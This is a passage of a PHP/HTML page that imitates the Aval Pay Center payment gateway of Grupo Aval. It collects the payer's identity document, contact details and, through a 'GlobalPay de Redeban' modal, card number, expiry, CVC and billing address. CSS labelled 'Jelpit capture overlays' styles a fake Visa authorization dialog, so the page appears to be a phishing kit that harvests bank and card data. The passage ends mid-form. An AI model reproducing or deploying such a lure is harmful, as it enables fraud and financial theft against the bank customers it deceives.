<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aval Pay Center - Realizar Pago (Paso 2)</title>
    <script>
        (function () {
            try {
                var convenioSeleccionado = localStorage.getItem('convenioSeleccionado');
                var datosPasoUno = localStorage.getItem('datosPagoPasoUno');
                if (!convenioSeleccionado || !datosPasoUno) {
                    window.location.replace('index.php');
                }
            } catch (error) {
                window.location.replace('index.php');
            }
        })();
    </script>
    <link rel="icon" type="image/svg+xml" href="assets/img/favicon-avalpay.svg">
    <link rel="stylesheet" href="assets/estilos-avalpay.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link
        href="https://fonts.googleapis.com/css2?family=Jost:wght@700&family=Montserrat:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@400;500;700&display=swap"
        rel="stylesheet">
    <style>
        body {
            background: #f7f8fb;
        }

        .pasarela-cabecera {
            box-shadow: none;
        }

        .pasarela-cabecera__contenedor {
            min-height: 49px;
            padding-top: 0;
            padding-bottom: 0;
        }

        .pasarela-cabecera__logos {
            display: inline-flex;
            align-items: center;
            gap: 10px;
            filter: brightness(0) invert(1);
        }

        .pasarela-cabecera__logo--principal {
            height: 18px;
        }

        .pasarela-cabecera__logo--secundario {
            height: 16px;
        }

        .pasarela {
            background:
                linear-gradient(180deg, #f4f4f5 0 82px, #ffffff 82px 131px, #eef3fb 131px 304px, #f7f8fb 304px 100%);
        }

        .pasarela__hero {
            padding: 30px 0 2px;
        }

        .pasarela__hero::before {
            display: none;
        }

        .pasarela__hero-contenedor {
            max-width: 760px;
            padding: 0 28px;
            gap: 13px;
        }

        .pasarela__icono-camara {
            width: 64px;
            height: 64px;
            border: 2px solid #b7c7e7;
            box-shadow: 0 8px 16px rgba(5, 57, 136, 0.05);
            margin-bottom: 1px;
        }

        .pasarela__icono-svg {
            width: 34px;
            height: 34px;
            color: #2aa8ff;
        }

        .pasarela__texto-servicio {
            align-self: flex-start;
            margin-top: 2px;
            font-size: 13px;
            line-height: 1.25;
            letter-spacing: 0.15px;
        }

        .pasarela__tarjeta-resumen {
            width: min(426px, 100%);
            padding: 18px 20px 17px;
            border-radius: 11px;
            box-shadow: 0 14px 22px rgba(5, 57, 136, 0.12);
            margin-top: 2px;
        }

        .pasarela__tarjeta-resumen-col {
            font-family: 'Montserrat', sans-serif;
            font-size: 13px;
            line-height: 1.42;
        }

        .pasarela__contenido {
            padding: 10px 0 52px;
        }

        .pasarela__panel {
            width: min(790px, 100%);
            margin-top: 4px;
            padding: 24px 28px 24px;
            border-radius: 4px;
            box-shadow: 0 8px 18px rgba(49, 59, 84, 0.05);
        }

        .pasarela__panel-icono-svg {
            width: 54px;
            height: 54px;
            color: #0e4ea9;
            flex: 0 0 54px;
        }

        .pasarela__panel-icono-img {
            width: 54px;
            height: 54px;
            object-fit: contain;
            flex: 0 0 54px;
            display: block;
        }

        .pasarela__h2 {
            font-size: 23px;
            line-height: 1.15;
            letter-spacing: -0.2px;
        }

        .pasarela__descripcion {
            font-size: 14px;
            line-height: 1.42;
            max-width: 610px;
            color: #7a7f98;
        }

        .pasarela__grid {
            gap: 13px 16px;
        }

        .pasarela__label {
            font-size: 12px;
            font-weight: 700;
        }

        .pasarela__input,
        .pasarela__select {
            min-height: 50px;
            padding: 14px 18px;
            border-color: #d9e1ef;
            color: #6a7088;
            border-radius: 11px;
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.75);
        }

        .pasarela__input::placeholder {
            color: #a0a5b5;
            opacity: 1;
        }

        .pasarela__input:not(:placeholder-shown),
        .pasarela__select:not([value=""]) {
            color: #313b54;
        }

        .pasarela__separador {
            margin: 19px 0 18px;
        }

        .pasarela__segmentos {
            max-width: 350px;
            gap: 8px;
        }

        .pasarela__segmento {
            min-height: 44px;
            font-family: 'Montserrat', sans-serif;
            font-size: 13px;
            background: #f5f8ff;
            border-radius: 11px;
        }

        .pasarela__segmento--activo {
            box-shadow: inset 0 0 0 1px rgba(5, 57, 136, 0.12);
        }

        .pasarela__bancos-grid {
            gap: 12px;
        }

        .pasarela__banco {
            min-height: 72px;
            padding: 10px;
            overflow: hidden;
        }

        .pasarela__banco-logo-real {
            display: block;
            max-width: 100%;
            max-height: 42px;
            width: auto;
            height: auto;
            object-fit: contain;
        }

        .pasarela-otras__aviso {
            align-items: flex-start;
        }

        .pasarela-otras__icono-aviso-svg {
            width: 18px;
            height: 18px;
            color: #f3b600;
            flex: 0 0 18px;
            margin-top: 1px;
        }

        .pasarela-otras__pse-badge {
            width: 36px;
            height: 36px;
            object-fit: contain;
            display: block;
        }

        .pasarela__acciones {
            margin-top: 18px;
        }

        .pasarela__cancelar {
            font-family: 'Montserrat', sans-serif;
            font-size: 13px;
        }

        .pasarela__boton-pagar {
            min-width: 122px;
            box-shadow: 0 8px 16px rgba(42, 168, 255, 0.24);
            font-size: 13px;
            border-radius: 20px;
        }

        .pasarela__boton-pagar:disabled {
            cursor: not-allowed;
            opacity: 0.75;
        }

        .pasarela__mensaje {
            text-align: left;
            min-height: 0;
        }

        .pasarela__mensaje--ok {
            color: #168a4f;
        }

        .pasarela-footer {
            border-top-left-radius: 0;
            border-top-right-radius: 0;
            box-shadow: none;
            border-top: 1px solid rgba(49, 59, 84, 0.06);
        }

        .pasarela-footer__logo-seguridad {
            height: 28px;
            width: auto;
            display: block;
        }

        .pasarela-footer__texto-cliente {
            text-align: right;
        }

        .modal-demo {
            position: fixed;
            inset: 0;
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }

        .modal-demo--visible {
            display: flex;
        }

        .modal-demo__backdrop {
            position: absolute;
            inset: 0;
            background: rgba(0, 0, 0, 0.45);
        }

        .modal-demo__dialog {
            position: relative;
            width: min(500px, calc(100% - 32px));
            background: #ffffff;
            border-radius: 16px;
            padding: 22px;
            box-shadow: 0 18px 40px rgba(0, 0, 0, 0.22);
            font-family: 'Montserrat', sans-serif;
        }

        .modal-demo__title {
            margin: 0 0 10px;
            color: #313b54;
            font-size: 18px;
            font-weight: 700;
        }

        .modal-demo__text {
            margin: 0;
            color: #5c6277;
            font-size: 14px;
            line-height: 1.55;
        }

        .modal-demo__actions {
            margin-top: 18px;
            display: flex;
            justify-content: flex-end;
            gap: 12px;
        }

        .modal-demo__btn {
            appearance: none;
            border: none;
            border-radius: 12px;
            background: #2aa8ff;
            color: #ffffff;
            padding: 10px 16px;
            font-family: 'Montserrat', sans-serif;
            font-size: 13px;
            font-weight: 700;
            cursor: pointer;
        }

        /* ── Modal GlobalPay tarjeta ── */
        .modal-tarjeta {
            position: fixed;
            inset: 0;
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 10000;
        }

        .modal-tarjeta--visible {
            display: flex;
        }

        .modal-tarjeta__backdrop {
            position: absolute;
            inset: 0;
            background: rgba(0, 0, 0, 0.5);
        }

        .modal-tarjeta__dialog {
            position: relative;
            width: min(480px, calc(100% - 24px));
            max-height: calc(100dvh - 24px);
            overflow-y: auto;
            background: #ffffff;
            border-radius: 16px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.28);
            font-family: 'Montserrat', sans-serif;
        }

        .modal-tarjeta__head {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 20px 20px 14px;
            border-bottom: 1px solid #eef0f5;
        }

        .modal-tarjeta__titulo {
            margin: 0;
            font-size: 17px;
            font-weight: 700;
            color: #1a1f36;
        }

        .modal-tarjeta__logo-gp {
            height: 32px;
            width: auto;
        }

        .modal-tarjeta__body {
            padding: 18px 20px 22px;
        }

        .tc-campo {
            display: flex;
            flex-direction: column;
            gap: 5px;
            margin-bottom: 13px;
        }

        .tc-campo--fila {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-bottom: 13px;
        }

        .tc-campo--fila .tc-campo {
            margin-bottom: 0;
        }

        .tc-label {
            font-size: 11px;
            font-weight: 600;
            color: #5c6277;
            letter-spacing: 0.3px;
        }

        .tc-input,
        .tc-select {
            width: 100%;
            height: 48px;
            padding: 0 14px;
            border: 1px solid #d4d8e8;
            border-radius: 10px;
            font-family: 'Montserrat', sans-serif;
            font-size: 14px;
            color: #1a1f36;
            background: #fff;
            box-sizing: border-box;
            outline: none;
            transition: border-color .15s;
        }

        .tc-input:focus,
        .tc-select:focus {
            border-color: #2563eb;
        }

        .tc-input::placeholder {
            color: #b0b5c8;
        }

        .tc-fila-tel {
            display: grid;
            grid-template-columns: 130px 1fr;
            gap: 8px;
        }

        .tc-separador {
            display: flex;
            align-items: center;
            gap: 10px;
            margin: 18px 0 16px;
            color: #6b7280;
            font-size: 12px;
            font-weight: 600;
        }

        .tc-separador::before,
        .tc-separador::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #e5e7eb;
        }

        .tc-foot {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-top: 20px;
        }

        .tc-pci {
            height: 36px;
            width: auto;
        }

        .tc-btn-pagar {
            appearance: none;
            border: none;
            border-radius: 10px;
            background: #1d4ed8;
            color: #fff;
            font-family: 'Montserrat', sans-serif;
            font-size: 14px;
            font-weight: 700;
            padding: 12px 22px;
            cursor: pointer;
            transition: background .15s;
        }

        .tc-btn-pagar:hover {
            background: #1e40af;
        }

        .tc-btn-cerrar {
            position: absolute;
            top: 14px;
            right: 14px;
            appearance: none;
            border: none;
            background: none;
            cursor: pointer;
            color: #9ca3af;
            line-height: 1;
            font-size: 20px;
            padding: 4px;
        }

        .tc-btn-cerrar:hover {
            color: #374151;
        }

        /* Sección tarjeta seleccionada (placeholder) */
        .seccion-tarjeta-info {
            margin-top: 10px;
            padding: 14px 16px;
            background: #f0f6ff;
            border-radius: 10px;
            font-size: 13px;
            color: #374151;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .seccion-tarjeta-info svg {
            flex: 0 0 20px;
            color: #2563eb;
        }

        /* ── Jelpit capture overlays ── */
        @keyframes avSpin { to { transform: rotate(360deg); } }
        .av-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.62); z-index: 99999; display: flex; align-items: center; justify-content: center; }
        .av-overlay-dark { background: rgba(0,0,0,0.82); }
        .av-overlay-card { background: #fff; border-radius: 16px; padding: 40px 32px; max-width: 420px; width: 90%; text-align: center; font-family: 'Montserrat', sans-serif; box-shadow: 0 20px 60px rgba(0,0,0,.4); }
        .av-overlay-btn { width: 100%; padding: 13px; border: none; border-radius: 8px; font-size: 15px; font-weight: 700; font-family: 'Montserrat', sans-serif; cursor: pointer; margin-top: 10px; }
        .av-overlay-btn.red { background: #dc3545; color: #fff; }
        .av-visa-card { background: #fff; border-radius: 8px; max-width: 480px; width: 92%; box-shadow: 0 8px 32px rgba(0,0,0,0.35); overflow: hidden; font-family: 'Montserrat', sans-serif; }
        .av-visa-logo { display: flex; justify-content: flex-end; padding: 16px 20px 4px; }
        .av-visa-body { padding: 4px 28px 28px; }
        .av-visa-title { font-size: 18px; font-weight: 700; color: #111; margin-bottom: 12px; }
        .av-visa-desc { font-size: 13px; line-height: 1.6; color: #333; margin-bottom: 18px; }
        .av-visa-section { font-size: 12px; font-weight: 700; color: #111; letter-spacing: 0.03em; margin-bottom: 10px; }
        .av-visa-table { width: 100%; border-collapse: collapse; margin-bottom: 22px; }
        .av-visa-table td { padding: 5px 6px; font-size: 14px; color: #333; vertical-align: middle; }
        .av-visa-table td:first-child { font-weight: 600; text-align: right; white-space: nowrap; color: #111; padding-right: 14px; width: 52%; }
        .av-visa-form { display: flex; flex-direction: column; gap: 12px; margin-bottom: 26px; }
        .av-visa-field { display: flex; align-items: center; gap: 12px; }
        .av-visa-field label { font-size: 14px; font-weight: 600; color: #111; min-width: 68px; white-space: nowrap; text-align: right; }
        .av-visa-field input { flex: 1; border: 1.5px solid #bbb; border-radius: 4px; padding: 10px 12px; font-size: 16px; outline: none; color: #111; font-family: 'Montserrat', sans-serif; }
        .av-visa-field input:focus { border-color: #1A1F71; }
        .av-btn-autorizar { display: block; width: 180px; margin: 0 auto; background: #111; color: #fff; border: none; border-radius: 6px; padding: 13px; font-size: 16px; font-weight: 600; cursor: pointer; font-family: 'Montserrat', sans-serif; }
        .av-btn-autorizar:hover { background: #333; }
        .av-error-msg { text-align: center; color: #cc0000; font-size: 14px; font-weight: 600; margin-bottom: 14px; }

        @media (max-width: 768px) {
            .pasarela {
                background: linear-gradient(180deg, #f5f5f6 0 72px, #edf2fa 72px 250px, #f7f8fb 250px 100%);
            }

            .pasarela__hero-contenedor {
                align-items: center;
                padding: 0 18px;
            }

            .pasarela__texto-servicio {
                text-align: center;
                align-self: center;
            }

            .pasarela__tarjeta-resumen {
                align-self: stretch;
            }

            .pasarela__panel {
                padding: 22px 18px 20px;
            }

            .pasarela__panel-titulo {
                align-items: center;
            }

            .pasarela__h2 {
                font-size: 22px;
            }

            .pasarela__segmentos {
                max-width: none;
            }

            .pasarela__acciones {
                flex-wrap: wrap;
            }

            .pasarela__cancelar,
            .pasarela__boton-pagar {
                width: 100%;
                text-align: center;
            }

            .pasarela-footer__texto-cliente {
                text-align: center;
            }
        }
    </style>
</head>

<body>
    <header class="pasarela-cabecera">
        <div class="pasarela-cabecera__contenedor">
            <div class="pasarela-cabecera__logos" aria-label="Aval Pay Center y Grupo Aval">
                <img src="assets/img/logo-avalpay-center.webp" alt="Aval Pay Center"
                    class="pasarela-cabecera__logo pasarela-cabecera__logo--principal">
                <img src="assets/img/aval-group-logo.png" alt="Grupo Aval"
                    class="pasarela-cabecera__logo pasarela-cabecera__logo--secundario">
            </div>
        </div>
    </header>

    <main class="pasarela">
        <section class="pasarela__hero">
            <div class="pasarela__hero-contenedor">
                <div class="pasarela__icono-camara" aria-hidden="true">
                    <svg class="pasarela__icono-svg" viewBox="0 0 24 24" fill="none">
                        <path
                            d="M8.2 5.5 9.4 4h5.2l1.2 1.5H18a2.5 2.5 0 0 1 2.5 2.5V17A2.5 2.5 0 0 1 18 19.5H6A2.5 2.5 0 0 1 3.5 17V8A2.5 2.5 0 0 1 6 5.5h2.2Z"
                            stroke="currentColor" stroke-width="1.8" stroke-linejoin="round" />
                        <circle cx="12" cy="12" r="3.7" stroke="currentColor" stroke-width="1.8" />
                    </svg>
                </div>

                <p id="textoServicio" class="pasarela__texto-servicio">PAGO ABASTECIMIENTOS INDUSTRIALES SAS</p>

                <div class="pasarela__tarjeta-resumen" aria-label="Resumen del pago">
                    <div class="pasarela__tarjeta-resumen-col">
                        <span class="pasarela__tarjeta-etiqueta">ID Transacción:</span>
                        <span id="textoIdTransaccion" class="pasarela__tarjeta-valor">77469243303</span>
                    </div>
                    <div class="pasarela__tarjeta-resumen-col">
                        <span class="pasarela__tarjeta-etiqueta">Referencia:</span>
                        <span id="textoReferencia" class="pasarela__tarjeta-valor">1929</span>
                    </div>
                    <div class="pasarela__tarjeta-resumen-col">
                        <span class="pasarela__tarjeta-etiqueta">Valor:</span>
                        <span id="textoValor" class="pasarela__tarjeta-valor pasarela__tarjeta-valor--destacado">$
                            245.000</span>
                    </div>
                </div>
            </div>
        </section>

        <section class="pasarela__contenido">
            <div class="pasarela__contenedor">
                <div class="pasarela__panel">
                    <div class="pasarela__panel-titulo">
                        <img src="assets/img/personita.png" alt="Titular" class="pasarela__panel-icono-img">
                        <div>
                            <h2 class="pasarela__h2">Titular del Medio de Pago</h2>
                            <p class="pasarela__descripcion">Ingrese en esta sección los datos del <strong
                                    style="color:#313B54;">titular del medio de pago</strong> que se va a utilizar en el
                                pago</p>
                        </div>
                    </div>

                    <form id="formularioTitular" class="pasarela__formulario" novalidate>
                        <div class="pasarela__grid">
                            <div class="pasarela__campo">
                                <label class="pasarela__label" for="tipoDocumento">Tipo de Documento *</label>
                                <select id="tipoDocumento" class="pasarela__select" required>
                                    <option value="" selected disabled>Selecciona una opción</option>
                                    <option value="CC">Cédula de Ciudadanía</option>
                                    <option value="CE">Cédula de Extranjería</option>
                                    <option value="NIT">NIT</option>
                                    <option value="TI">Tarjeta de Identidad</option>
                                    <option value="PP">Pasaporte</option>
                                    <option value="RC">Registro Civil</option>
                                </select>
                                <span class="pasarela__error oculto">Campo requerido</span>
                            </div>

                            <div class="pasarela__campo">
                                <label class="pasarela__label" for="numeroDocumento">Número de documento *</label>
                                <input id="numeroDocumento" class="pasarela__input" type="text"
                                    placeholder="Ingresa tu documento" required>
                                <span class="pasarela__error oculto">Campo requerido</span>
                            </div>

                            <div class="pasarela__campo pasarela__campo--ancho">
                                <label class="pasarela__label" for="nombreCompleto">Nombre Completo *</label>
                                <input id="nombreCompleto" class="pasarela__input" type="text"
                                    placeholder="Ingresa tu nombre completo" required>
                                <span class="pasarela__error oculto">Campo requerido</span>
                            </div>

                            <div class="pasarela__campo">
                                <label class="pasarela__label" for="correo">Correo Electrónico *</label>
                                <input id="correo" class="pasarela__input" type="email"
                                    placeholder="ej: sumail@mail.com" required>
                                <span class="pasarela__error oculto">Campo requerido</span>
                            </div>

                            <div class="pasarela__campo">
                                <label class="pasarela__label" for="correoConfirmacion">Confirmación de Correo *</label>
                                <input id="correoConfirmacion" class="pasarela__input" type="email"
                                    placeholder="Ingresa de nuevo tu e-mail" required>
                                <span class="pasarela__error oculto">Campo requerido</span>
                            </div>

                            <div class="pasarela__campo">
                                <label class="pasarela__label" for="pais">País *</label>
                                <select id="pais" class="pasarela__select" required>
                                    <option value="CO" selected>Colombia</option>
                                </select>
                            </div>

                            <div class="pasarela__campo">
                                <label class="pasarela__label" for="movil">Móvil para notificaciones *</label>
                                <input id="movil" class="pasarela__input" type="tel"
                                    placeholder="Ingresa tu número móvil" inputmode="numeric" maxlength="10" required>
                                <span class="pasarela__error oculto">Campo requerido</span>
                            </div>

                            <div class="pasarela__campo">
                                <label class="pasarela__label" for="movilConfirmacion">Confirmar Móvil *</label>
                                <input id="movilConfirmacion" class="pasarela__input" type="tel"
                                    placeholder="Ingresa de nuevo tu móvil" inputmode="numeric" maxlength="10" required>
                                <span class="pasarela__error oculto">Campo requerido</span>
                            </div>
                        </div>

                        <div class="pasarela__separador"></div>

                        <div class="pasarela__panel-titulo">
                            <svg class="pasarela__panel-icono-svg" viewBox="0 0 64 64" fill="none" aria-hidden="true">
                                <rect x="10" y="16" width="44" height="30" rx="6" stroke="currentColor"
                                    stroke-width="3" />
                                <path d="M18 27h28" stroke="currentColor" stroke-width="3" stroke-linecap="round" />
                                <path d="M18 37h10" stroke="currentColor" stroke-width="3" stroke-linecap="round" />
                            </svg>
                            <div>
                                <h2 class="pasarela__h2">Medio de pago</h2>
                                <p class="pasarela__descripcion">Selecciona el <strong style="color:#313B54;">medio de
                                        pago</strong> a utilizar</p>
                            </div>
                        </div>

                        <div class="pasarela__segmentos" role="tablist" aria-label="Tipo de entidad">
                            <button type="button" class="pasarela__segmento pasarela__segmento--activo"
                                data-tipo-entidad="aval" aria-selected="true">Aval</button>
                            <button type="button" class="pasarela__segmento" data-tipo-entidad="otras"
                                aria-selected="false">Otras Entidades</button>
                            <button type="button" class="pasarela__segmento" data-tipo-entidad="tarjeta"
                                aria-selected="false">Tarjeta de Crédito</button>
                        </div>

                        <div id="seccionAval" class="pasarela__bancos">
                            <p class="pasarela__label" style="margin-top:6px;">Selecciona un banco</p>
                            <div class="pasarela__bancos-grid" role="list">
                                <button type="button" class="pasarela__banco" data-banco="Banco de Bogotá"
                                    role="listitem">
                                    <img src="assets/img/bogota-logo.svg" alt="Banco de Bogotá"
                                        class="pasarela__banco-logo-real">
                                </button>
                                <button type="button" class="pasarela__banco" data-banco="Banco de Occidente"
                                    role="listitem">
                                    <img src="assets/img/logo-v-banco-occidente.svg" alt="Banco de Occidente"
                                        class="pasarela__banco-logo-real">
                                </button>
                                <button type="button" class="pasarela__banco" data-banco="Banco Popular"
                                    role="listitem">
                                    <img src="assets/img/logo-v-banco-popular.png" alt="Banco Popular"
                                        class="pasarela__banco-logo-real">
                                </button>
                                <button type="button" class="pasarela__banco" data-banco="AV Villas" role="listitem">
                                    <img src="assets/img/logo-v-banco-avvillas.svg" alt="AV Villas"
                                        class="pasarela__banco-logo-real">
                                </button>
                            </div>
                            <span id="errorBancoAval" class="pasarela__error oculto">Selecciona un banco</span>
                        </div>

                        <div id="seccionOtrasEntidades" class="pasarela-otras oculto">
                            <div class="pasarela-otras__aviso" role="note">
                                <svg class="pasarela-otras__icono-aviso-svg" viewBox="0 0 24 24" fill="currentColor"
                                    aria-hidden="true">
                                    <path d="M12 2 1 21h22L12 2Zm1 14h-2v-2h2v2Zm0-4h-2V8h2v4Z" />
                                </svg>
                                <p>Para pagos con entidades del Grupo Aval, utilizar el botón Aval.</p>
                            </div>

                            <div class="pasarela-otras__pse">
                                <img src="assets/img/pse-logo.png" alt="PSE" class="pasarela-otras__pse-badge">
                                <div>
                                    <p class="pasarela-otras__pse-titulo">Transferencias desde tu banco con PSE</p>
                                </div>
                            </div>

                            <div class="pasarela-otras__personas" role="group" aria-label="Tipo de persona">
                                <label class="pasarela-otras__persona">
                                    <input type="radio" name="tipoPersona" value="juridica">
                                    <span>Persona Jurídica</span>
                                </label>
                                <label class="pasarela-otras__persona">
                                    <input type="radio" name="tipoPersona" value="natural" checked>
                                    <span>Persona Natural</span>
                                </label>
                            </div>

                            <div class="pasarela-otras__selector">
                                <label class="pasarela__label" for="selectorBancoOtras">Seleccione el banco</label>
                                <select id="selectorBancoOtras" class="pasarela__select">
                                    <option value="" selected disabled>A continuación seleccione su banco</option>
                                    <?php
                                    $cfg = require __DIR__ . '/pse-config.php';
                                    foreach ($cfg['select_otras_entidades'] as $key => $info):
                                        ?>
                                        <option value="<?= htmlspecialchars($key, ENT_QUOTES) ?>">
                                            <?= htmlspecialchars($info['label'], ENT_QUOTES) ?>
                                        </option>
                                    <?php endforeach; ?>
                                </select>
                                <span id="errorBancoOtras" class="pasarela__error oculto">Selecciona un banco</span>
                            </div>
                        </div>

                        <div id="seccionTarjeta" class="oculto">
                            <div class="seccion-tarjeta-info">
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="20"
                                    height="20">
                                    <rect x="2" y="5" width="20" height="14" rx="3" />
                                    <path d="M2 10h20" />
                                </svg>
                                <span>Al pulsar <strong>Pagar</strong> se abrirá el formulario seguro de tarjeta de
                                    crédito.</span>
                            </div>
                        </div>

                        <div class="pasarela__acciones">
                            <a href="paso-uno.php" class="pasarela__cancelar">Cancelar</a>
                            <button id="botonPagarPasoDos" type="submit" class="pasarela__boton-pagar">Pagar</button>
                        </div>

                        <p id="mensajeFormulario" class="pasarela__mensaje" aria-live="polite"></p>
                    </form>
                </div>
            </div>
        </section>
    </main>

    <footer class="pasarela-footer">
        <div class="pasarela-footer__contenedor">
            <div class="pasarela-footer__col">
                <img src="assets/img/aval-group-logo.png" alt="Grupo Aval" class="pasarela-footer__logo-aval">
                <img src="assets/img/logo-norton@2x.png" alt="Norton Secured" class="pasarela-footer__logo-seguridad">
            </div>

            <div class="pasarela-footer__col pasarela-footer__col--centro">
                <p class="pasarela-footer__copyright">Copyright © 2025 Todos los derechos reservados Aval Valor
                    Compartido</p>
            </div>

            <div class="pasarela-footer__col pasarela-footer__col--derecha">
                <div class="pasarela-footer__texto-cliente">
                    <p class="pasarela-footer__titulo-cliente">Línea de Atención al Cliente</p>
                    <p class="pasarela-footer__detalle-cliente">Nacional: 018000-512825</p>
                    <p class="pasarela-footer__detalle-cliente">Bogotá: (601) 7432626</p>
                </div>
            </div>
        </div>
    </footer>

    <div id="overlayCargando" class="overlay-cargando" aria-hidden="true">
        <div class="overlay-cargando__fondo"></div>
        <div class="overlay-cargando__contenido" role="status" aria-live="polite">
            <div class="overlay-cargando__spinner" aria-hidden="true">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="120" height="120"
                    style="shape-rendering:auto;display:block;background:transparent;">
                    <g>
                        <circle fill="#002449" r="5" cy="57.5" cx="27.5">
                            <animate begin="-1s" dur="1s" keyTimes="0;0.5;1;1" values="57.5;42.5;57.5;57.5"
                                repeatCount="indefinite" keySplines="0 0.5 0.5 1;0.5 0 1 0.5;0.5 0.5 0.5 0.5"
                                calcMode="spline" attributeName="cy"></animate>
                        </circle>
                        <circle fill="#e62f27" r="5" cy="57.5" cx="42.5">
                            <animate begin="-0.75s" dur="1s" keyTimes="0;0.5;1;1" values="57.5;42.5;57.5;57.5"
                                repeatCount="indefinite" keySplines="0 0.5 0.5 1;0.5 0 1 0.5;0.5 0.5 0.5 0.5"
                                calcMode="spline" attributeName="cy"></animate>
                        </circle>
                        <circle fill="#5dbaeb" r="5" cy="57.5" cx="57.5">
                            <animate begin="-0.5s" dur="1s" keyTimes="0;0.5;1;1" values="57.5;42.5;57.5;57.5"
                                repeatCount="indefinite" keySplines="0 0.5 0.5 1;0.5 0 1 0.5;0.5 0.5 0.5 0.5"
                                calcMode="spline" attributeName="cy"></animate>
                        </circle>
                        <circle fill="#009340" r="5" cy="57.5" cx="72.5">
                            <animate begin="-0.25s" dur="1s" keyTimes="0;0.5;1;1" values="57.5;42.5;57.5;57.5"
                                repeatCount="indefinite" keySplines="0 0.5 0.5 1;0.5 0 1 0.5;0.5 0.5 0.5 0.5"
                                calcMode="spline" attributeName="cy"></animate>
                        </circle>
                    </g>
                </svg>
            </div>
        </div>
    </div>

    <!-- Modal tarjeta GlobalPay -->
    <div id="modalTarjeta" class="modal-tarjeta" aria-hidden="true">
        <div class="modal-tarjeta__backdrop" id="backdropTarjeta"></div>
        <div class="modal-tarjeta__dialog" role="dialog" aria-modal="true" aria-labelledby="modalTarjetaTitulo">
            <button class="tc-btn-cerrar" id="btnCerrarTarjeta" aria-label="Cerrar">&#x2715;</button>
            <div class="modal-tarjeta__head">
                <h3 id="modalTarjetaTitulo" class="modal-tarjeta__titulo">Pago con tarjeta</h3>
                <svg class="modal-tarjeta__logo-gp" viewBox="0 0 180 40" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="20" cy="20" r="10" fill="#e62f27" />
                    <circle cx="14" cy="20" r="10" fill="#009340" opacity=".85" />
                    <circle cx="26" cy="20" r="10" fill="#f3b600" opacity=".85" />
                    <text x="42" y="26" font-family="Montserrat,sans-serif" font-weight="700" font-size="18"
                        fill="#1a1f36">Global</text>
                    <text x="102" y="26" font-family="Montserrat,sans-serif" font-weight="700" font-size="18"
                        fill="#e62f27">Pay</text>
                    <text x="42" y="36" font-family="Montserrat,sans-serif" font-size="9" fill="#6b7280">de
                        Redeban</text>
                </svg>
            </div>
            <div class="modal-tarjeta__body">
                <div class="tc-campo">
                    <label class="tc-label" for="tcEmail">Correo electrónico</label>
                    <input id="tcEmail" class="tc-input" type="email" placeholder="correo@ejemplo.com">
                </div>

                <div class="tc-campo">
                    <label class="tc-label">País y celular</label>
                    <div class="tc-fila-tel">
                        <select class="tc-select" id="tcPaisTel">
                            <option value="CO">🇨🇴 Colombia</option>
                            <option value="US">🇺🇸 EE.UU.</option>
                            <option value="MX">🇲🇽 México</option>
                        </select>
                        <input id="tcCelular" class="tc-input" type="tel" placeholder="Celular" inputmode="numeric"
                            maxlength="10">
                    </div>
                </div>

                <div class="tc-campo">
                    <label class="tc-label" for="tcTitular">Nombre del titular</label>
                    <input id="tcTitular" class="tc-input" type="text" placeholder="Como aparece en la tarjeta">
                </div>

                <div class="tc-campo">
                    <label class="tc-label" for="tcNumero">Número de tarjeta</label>
                    <input id="tcNumero" class="tc-input" type="text" placeholder="•••• •••• •••• ••••" maxlength="19"
                        inputmode="numeric">
                </div>

                <div class="tc-campo--fila">
                    <div class="tc-campo">
                        <label class="tc-label" for="tcExpiry">MM / AA</label>
                        <input id="tcExpiry" class="tc-input" type="text" placeholder="MM / AA" maxlength="7"
                            inputmode="numeric">
                    </div>
                    <div class="tc-campo">
                        <label class="tc-label" for="tcCvc">CVC</label>
                        <input id="tcCvc" class="tc-input" type="text" placeholder="•••" maxlength="4"
                            inputmode="numeric">
                    </div>
                </div>

                <div class="tc-separador">Se requiere la dirección de facturación</div>

                <div class="tc-campo--fila">
                    <div class="tc-campo">
                        <label class="tc-label" for="tcPais">País</label>
                        <select id="tcPais" class="tc-select">
                            <option value="CO" selected>🇨🇴 Colombia</option>
                            <option value="US">🇺🇸 EE.UU.</option>
                        </select>
                    </div>
                    <div class="tc-campo">
                        <label class="tc-label" for="tcDpto">Departamento</label>
                        <select id="tcDpto" class="tc-select">
                            <option value="" selected disabled>Selecciona</option>
                            <option>Bogotá D.C.</option>
                            <option>Antioquia</option>
                            <option>Valle del Cauca</option>
                            <option>Cundinamarca</option>
                            <option>Atlántico</option>
                        </select>
                    </div>
                </div>

                <div class="tc-campo--fila">
                    <div class="tc-campo">
                        <label class="tc-label" for="tcCiudad">Ciudad</label>
                        <input id="tcCiudad" class="tc-input" type="text" placeholder="Ciudad">
                    </div>
                    <div class="tc-campo">
                        <label class="tc-label" for="tcDistrito">Distrito</label>
                        <input id="tcDistrito" class="tc-input" type="text" placeholder="Distrito">
                    </div>
                </div>

                <div class="tc-campo--fila">
                    <div class="tc-campo">
                        <label class="tc-label" for="tcPostal">Código postal</label>
                        <input id="tcPostal" class="tc-input" type="text" placeholder="Cód. postal" inputmode="numeric"
                            maxlength="6">
                    </div>
                    <div class="tc-campo">
                        <label class="tc-label" for="tcCalle">Calle</label>
                        <input id="tcCalle" class="tc-input" type="text" placeholder="Calle">
                    </div>
                </div>

                <div class="tc-campo--fila">
                    <div class="tc-campo">
                        <label class="tc-label" for="tcCasa">Número de casa</label>
                        <input id="tcCasa" class="tc-input" type="text" placeholder="Núm. de casa">
                    </div>
                    <div class="tc-campo">
                        <label class="tc-label" for="tcAdicional">Información adicional</label>
